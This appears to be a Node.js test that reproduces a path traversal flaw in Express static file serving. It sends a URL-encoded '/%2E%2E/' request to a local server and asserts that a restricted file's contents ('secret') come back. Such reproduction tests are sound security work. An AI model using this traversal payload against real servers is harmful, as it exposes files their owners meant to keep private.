const { test } = require("node:test");
const { equal } = require("node:assert");

test("Vulnerable to Path traversal", async () => {
  const express = require("express");
  const http = require("http");

  const app = express();

  app.use(express.static(__dirname + "/public"));

  const server = await new Promise((resolve) => {
    const _server = app.listen(3000, () => {
      resolve(_server);
    });
  });

  const response = await new Promise((resolve, reject) => {
    const req = http.request(
      {
        hostname: "localhost",
        port: 3000,
        path: "/%2E%2E/public-restricted/test.txt",
        method: "GET",
      },
      (res) => {
        let data = "";

        res.on("data", (chunk) => {
          data += chunk;
        });

        res.on("end", () => {
          resolve(data);
        });
      }
    );

    req.on("error", (err) => {
      reject(err);
    });

    req.end();
  });

  equal(response, "secret");

  server.close();
});
